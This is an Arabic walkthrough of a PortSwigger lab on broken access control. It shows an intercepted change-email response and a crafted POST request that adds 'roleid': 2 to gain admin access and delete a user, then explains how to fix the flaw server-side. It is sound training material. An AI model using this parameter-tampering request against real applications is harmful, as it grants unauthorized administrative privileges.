# [User role can be modified in user profile](https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile)

## **`الهدف`**
الدخول إلى لوحة تحكم الإدارة وحذف المُستخدم `carlos.`
## **`خطوات الحل`**
نقوم بالدخول إلى حساب `wiener:peter` ونحاول تغير الـ `email` الخاص بنا ونقوم باعتراض الـ `response` لنلاحظ وجود `"roleid": 1`
```http
HTTP/2 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8


{
  "username": "wiener",
  "email": "king@test.com",
  "apikey": "x717II1qVx1GkdISf7TisgSblZlp2iV0",
  "roleid": 1
}
```

لذلك كل ماعلينا فعله هو محاولة تغيير الـ `email` مرة أخرى ولكن نقوم بإضافة الـ `"roleid":2` في الـ `request` ونقوم بتمريره 
```http
POST /my-account/change-email HTTP/2
Host: 0aa000b504b509a481ce169d00d0008f.web-security-academy.net
Cookie: session=srWPd4J3tpYERzpqsy3EXwiUIG08GH3G

{"email":"test.est@test.com",
  "roleid": 2}
```

لنلاحظ ظهور زر `Admin panel` وبالضغط عليه نقوم بالدخول إلى لوحة التحكم ونقوم بحذف المُستخدم `carlos` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
عندما يحاول المُستخدم تغيير الـ `email` أو الـ `password` يجب على السيرفر أن يستقبل فقط المتغيرت المسموح للمُستخدم العادي بتغييرها (الـ`email` والـ `password`) وأن يتجاهل أو يرفض أى متغيرات إضافية في الـ `request` غير مسموح للمُستخدم العادي بتعديلها.

ولا يجوز أبدًا تعديل الـ `roleid` أبدًا من خلال نفس المسار `endpoint` المُخصص لتعديل البيانات الشخصية للمُستخدم العادي `(/my-account/change-email)` فتغيير الصلاحيات يجب أن يتم فقط من خلال لوحة تحكم الإدارة `(/admin/manage-users) `وبواسطة شخص يمتلك صلاحيات `Admin` بالفعل، ويجب على السيرفر أن يتعامل مع الـ `roleid` كقيمة للقراءة فقط `(Read-Only)` عند المُستخدم، ويتم تحديدها وجلبها من قاعدة البيانات بناءً على الـ `Session` الخاصة بالمُستخدم، وليس بناءً على الكلام الذي يكتبه المُستخدم في الـ `Request`.
